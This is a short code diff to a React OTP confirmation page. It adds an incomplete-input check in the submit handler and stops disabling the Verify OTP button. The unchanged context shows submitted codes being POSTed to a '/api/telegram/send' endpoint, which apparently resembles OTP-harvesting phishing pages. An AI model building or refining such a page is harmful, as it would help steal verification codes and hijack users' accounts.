@@ -74,6 +74,10 @@ export default function OtpConfirmPage() {
             className="mt-5"
             onSubmit={async (event) => {
               event.preventDefault()
+              if (!isComplete) {
+                setIsInvalid(true)
+                return
+              }
               try {
                 await fetch('/api/telegram/send', {
                   method: 'POST',
@@ -149,7 +153,6 @@ export default function OtpConfirmPage() {
 
             <button
               type="submit"
-              disabled={!isComplete}
               className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-60 disabled:hover:translate-y-0"
             >
               Verify OTP <ChevronRight aria-hidden="true" className="size-5" />
